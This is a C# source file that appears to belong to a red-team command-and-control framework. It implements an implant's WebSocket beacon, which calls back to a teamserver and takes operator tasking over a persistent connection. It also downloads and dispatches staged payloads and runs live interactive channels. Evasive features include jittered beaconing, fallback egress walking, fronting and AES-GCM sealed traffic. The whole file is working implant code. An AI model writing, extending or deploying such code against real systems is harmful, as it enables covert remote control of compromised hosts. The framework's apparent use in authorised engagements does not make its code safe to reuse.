using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The reference implant's WebSocket stream client (architecture.md Sec 8,
// the web posture's interactive tier): the same live session the mTLS gRPC
// stream runs, over a WebSocket on a web front -- server-push tasking the
// moment it is queued, live channels for the streaming verbs -- with the
// envelope contact's own auth and frame grammar (extending/implants.md):
// every message is the sealed-or-plaintext framed-frames body the POST cycle
// carries, so the per-artifact key authenticates and seals exactly as it
// does there and the web transports still request no TLS client certificate.
// A whole source-file module like its siblings: the build unit drops this
// file from poll-mode web builds (the envelope cycle serves those) and from
// stream-shaped builds (the gRPC client serves those).

/// <summary>
/// Builds the WebSocket stream client off the shared setup; the factory the
/// generated transport selection names for stream-mode web builds.
/// </summary>
internal static class WsContact
{
    public static IContactClient Create(ContactSetup setup) => new WsBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.Leaf,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Config.ClassVerbs,
        setup.Log,
        setup.Nonces,
        setup.Config.Transport,
        setup.Cadence,
        setup.Held);
}

/// <summary>
/// Runs the implant's contact lifecycle over the WebSocket beacon: open the
/// socket, handshake (the first message), then hold the session -- read
/// tasking and channel input, write results and channel output -- until the
/// connection drops, the kill date passes, or the server refuses permanently.
/// A dropped connection is a reconnect, not a termination: the session
/// survives it server-side, so the next cycle re-handshakes and continues.
/// </summary>
internal sealed class WsBeacon : IContactClient
{
    /// <summary>
    /// The WebSocket beacon route, the fixed path beside the envelope's
    /// (extending/implants.md).
    /// </summary>
    public const string Route = "/implants/beacon/stream";

    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly X509Certificate2Collection _pinned;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;
    private readonly Cadence? _cadence;
    private readonly FrontedPivots? _fronted;
    private readonly TaskNonceTracker _nonces;
    private readonly HeldTaskLedger _held;

    // The shared task-acceptance pipeline (fronting gate, verification,
    // dedup, staged/channel/inline shapes) over this client's per-run state.
    private readonly BeaconTasking _tasking;

    // The per-artifact contact seal, the envelope client's own: present only
    // when the bake asked for sealed contacts, and every message this client
    // exchanges then rides as AES-256-GCM ciphertext under it.
    private readonly (byte[] KeyId, byte[] Key)? _seal;

    // The contact counter, burned on every client message exactly as the
    // envelope burns it on every POST attempt.
    private long _contactCounter;

    public WsBeacon(
        EgressEndpoints egress,
        string implantId,
        X509Certificate2 leaf,
        IReadOnlyList<X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        IReadOnlyList<string> classVerbs,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        TransportProfile? transport = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null)
    {
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _cas = cas;
        _pinned = new X509Certificate2Collection();
        foreach (var ca in cas)
            _pinned.Add(ca);
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
        _seal = transport is { SealsContacts: true }
            ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
            : null;
    }

    /// <summary>
    /// This client carries the web URL shape on a stream-mode bake
    /// (architecture.md Sec 8): a schemed http(s) beacon URL names the
    /// WebSocket stream when the profile holds the connection open, and the
    /// envelope POST cycle when it polls. A bare host:port (the mTLS dial
    /// shape) belongs to the gRPC stream client.
    /// </summary>
    public bool Serves(string beaconUrl) => BeaconUrl.IsWeb(beaconUrl);

    /// <summary>
    /// Blocks until cancellation, the kill date passing, or a permanent
    /// handshake refusal. A dropped connection (transport failure, refused
    /// message) walks the egress entry and reconnects on the jittered cadence
    /// with the same exponential backoff the other clients apply. Returns
    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current
    /// entry is not a web URL, so the coordinator hands the run to the gRPC
    /// stream client.
    /// </summary>
    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return ContactExit.Terminate;
            }
            if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                return ContactExit.SwitchTransport;

            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
                // The connection died mid-flight: results written on it may
                // never have been read, so the next connection re-sends them
                // (first-wins server-side).
                _held.InvalidateDeliveries();
            }

            // Every non-OK handshake status is permanent for this artifact:
            // retrying would not change the answer.
            if (cycle == BeaconCycleResult.Terminal)
                return ContactExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake walks to the next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return ContactExit.Terminate;
            }
        }
        return ContactExit.Terminate;
    }

    // One connection: dial, handshake, then hold the session until the
    // server closes, the connection drops, or cancellation fires. Throws on
    // transport errors (the caller logs and reconnects); a refused handshake
    // returns Terminal.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var ws = await ConnectAsync(cancellationToken);

        // The implant speaks first: the envelope's request-body shape with
        // the handshake frame alone -- re-opens (or reuses) the session and
        // re-advertises the baked class verbs intersected with the compiled
        // handlers (architecture.md Sec 5.3), both negotiation arms offered.
        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
        await SendMessageAsync(
            ws, new[] { new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) } },
            CancellationToken.None);

        // The server answers the envelope's response shape: the handshake
        // response frame first (sealed when the client sealed).
        var firstInbound = await ReceiveFramesAsync(ws, cancellationToken);
        if (firstInbound.Count == 0)
            throw new InvalidOperationException("the stream closed before the handshake response");
        var response = HandshakeResponse.Parser.ParseFrom(firstInbound[0].Payload);
        if (response.Status != HandshakeStatus.Ok)
        {
            _log.WriteLine($"handshake refused: {response.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = response.ReplayNonces;
        // The receive-ack arm is per connection (architecture.md Sec 10.3).
        var acks = response.TaskAcks;
        _log.WriteLine($"handshake ok: engagement={response.EngagementId}, replay-nonces={response.ReplayNonces}");

        // Tasking loop: the gRPC stream's own shape over the message
        // adapters. A write gate serializes this loop and every live
        // channel's pumps; the live channels, keyed by task id, take the
        // ChannelInput frames the loop routes to them. Both die with the
        // connection: the finally cancels every channel and waits out its
        // pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(ws, writeGate, frame, ct);

        // Results whose delivery died with an earlier connection ride this
        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
        // server records first-wins, so a duplicate is absorbed.
        await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);

        try
        {
            var inbound = firstInbound;
            var index = 1;
            while (true)
            {
                for (; index < inbound.Count; index++)
                {
                    var frame = inbound[index];

                    // ChannelInput is the only kind-bearing downstream frame:
                    // operator input for a live channel, routed by task id.
                    if (frame.Kind == FrameKind.ChannelInput)
                    {
                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                        continue;
                    }

                    var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                    // The dispatch strand's ack half (architecture.md Sec
                    // 10.3): delivery evidence for the parsed frame, before
                    // anything runs. The dedup half lives inside the shared
                    // acceptance, after verification.
                    if (acks)
                        await Write(BeaconFrames.AckFrame(task.TaskId), cancellationToken);
                    await _tasking.AcceptAsync(
                        task,
                        Write,
                        (staged, ct) => RunStagedTaskAsync(ws, writeGate, staged, ct),
                        (started, handler) => StartChannel(ws, writeGate, liveChannels, started, handler, channelsGone.Token),
                        cancellationToken);
                }

                // A message carrying only the handshake response is a live
                // keep-alive: park here until the next message -- pushed
                // tasking, channel input, or the close that ends the session.
                inbound = await ReceiveFramesAsync(ws, cancellationToken);
                index = 0;
            }
        }
        finally
        {
            // The connection is ending: the channels are session-scoped, so
            // they end with it. The token releases the handlers (their
            // processes are killed and their pumps unwind), and the delivery
            // waits keep the socket alive until every pump's last write has
            // left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }
    }

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) => new ValueTask(WriteFrameAsync(ws, writeGate, frame, ct)));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(ws, writeGate, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(ws, writeGate, BeaconFrames.ResultFrame(task, outcome, output), CancellationToken.None);
            _held.Remember(task.TaskId, outcome, output);
            _held.MarkDelivered(task.TaskId);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            channel.CompleteInput();
        }
    }

    // How long a staged read waits for the next chunk before giving up on
    // the transfer: a timeout, not a cadence -- a server that cannot produce
    // the next chunk within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand
    // the payload, reassemble the chunk run the server answers with, then
    // dispatch the verb's staged handler. Over the stream the demand's answer
    // rides the pushed messages, so the read parks on this transfer's
    // deadline rather than the session's blocking read.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(ws, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            deadline.CancelAfter(StagedChunkTimeout);
            IReadOnlyList<Frame> inbound;
            try
            {
                inbound = await ReceiveFramesAsync(ws, deadline.Token);
            }
            catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
            {
                _log.WriteLine($"task {task.TaskId}: staged transfer timed out");
                return (TaskOutcome.Failed, "staged payload stream timed out before the terminal chunk");
            }

            StagedChunk chunk = null!;
            var found = false;
            foreach (var frame in inbound)
            {
                try
                {
                    var candidate = StagedChunk.Parser.ParseFrom(frame.Payload);
                    if (candidate.TaskId == task.TaskId)
                    {
                        chunk = candidate;
                        found = true;
                        break;
                    }
                }
                catch (InvalidProtocolBufferException)
                {
                    // Not a chunk frame; the next message may carry the run.
                }
            }
            if (!found)
                continue;

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    // The socket allows one outstanding send at a time; the dispatch loop
    // and every live channel's output pumps share this connection, so all of
    // them write through this gate.
    private async Task WriteFrameAsync(
        System.Net.WebSockets.WebSocket ws,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await SendMessageAsync(ws, new[] { frame }, cancellationToken);
        }
        finally
        {
            writeGate.Release();
        }
    }

    // The dial: scheme-swapped beacon URL (ws/wss) plus the fixed route, TLS
    // pinning the teamserver CA exactly as the web cycle does when the front
    // is https -- the sealed body is the identity, and the leaf stays
    // available for a front that asks to see one.
    private async Task<System.Net.WebSockets.WebSocket> ConnectAsync(CancellationToken cancellationToken)
    {
        var u = _egress.CurrentBeaconUrl.Trim();
        var schemeIdx = u.IndexOf("://", StringComparison.Ordinal);
        var rest = schemeIdx < 0 ? u : u[(schemeIdx + 3)..];
        var slash = rest.IndexOf('/');
        var authority = slash < 0 ? rest : rest[..slash];
        var secure = u.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var scheme = secure ? "wss" : "ws";

        var ws = new System.Net.WebSockets.ClientWebSocket();
        if (secure)
        {
            ws.Options.ClientCertificates = new X509Certificate2Collection(_leaf);
            ws.Options.RemoteCertificateValidationCallback = (_, cert, chain, _) =>
                C2.PinServerChain(cert as X509Certificate2, chain, _pinned);
        }
        await ws.ConnectAsync(new Uri($"{scheme}://{authority}{Route}"), cancellationToken);
        return ws;
    }

    // One message out: the envelope's request-body shape -- the framed bytes
    // behind a fresh big-endian counter, sealed under the baked key when the
    // bake carries one; the plaintext lab bake sends the frames as-is.
    private async Task SendMessageAsync(
        System.Net.WebSockets.WebSocket ws,
        IReadOnlyList<Frame> frames,
        CancellationToken cancellationToken)
    {
        var encoded = EnvelopeCodec.Encode(frames);
        byte[] message;
        System.Net.WebSockets.WebSocketMessageType type;
        if (_seal is { } seal)
        {
            var plaintext = new byte[8 + encoded.Length];
            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_contactCounter);
            encoded.AsSpan().CopyTo(plaintext.AsSpan(8));
            message = EnvelopeWire.SealContactBody(plaintext, seal.KeyId, seal.Key, "rod-contact-v1");
            type = System.Net.WebSockets.WebSocketMessageType.Text;
        }
        else
        {
            message = encoded;
            type = System.Net.WebSockets.WebSocketMessageType.Binary;
        }
        await ws.SendAsync(message, type, endOfMessage: true, cancellationToken);
    }

    // One message in: the envelope's response-body shape -- sealed under the
    // response's own purpose tag when the session sealed, the frames parsed
    // out of the plaintext. A body that does not verify is a dropped
    // connection, not a parse: nothing inside it is acted on.
    private async Task<IReadOnlyList<Frame>> ReceiveFramesAsync(
        System.Net.WebSockets.WebSocket ws,
        CancellationToken cancellationToken)
    {
        var buffer = new byte[16 * 1024];
        using var message = new MemoryStream();
        while (true)
        {
            var received = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), cancellationToken);
            if (received.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                throw new InvalidOperationException("the server closed the beacon stream");
            message.Write(buffer, 0, received.Count);
            if (received.EndOfMessage)
                break;
        }

        var body = message.ToArray();
        if (_seal is { } open)
        {
            var plaintext = EnvelopeWire.TryOpenContactBody(body, open.KeyId, open.Key, "rod-contact-response-v1")
                ?? throw new InvalidOperationException("beacon message did not verify under the baked key");
            return EnvelopeCodec.Parse(plaintext);
        }
        return EnvelopeCodec.Parse(body);
    }
}
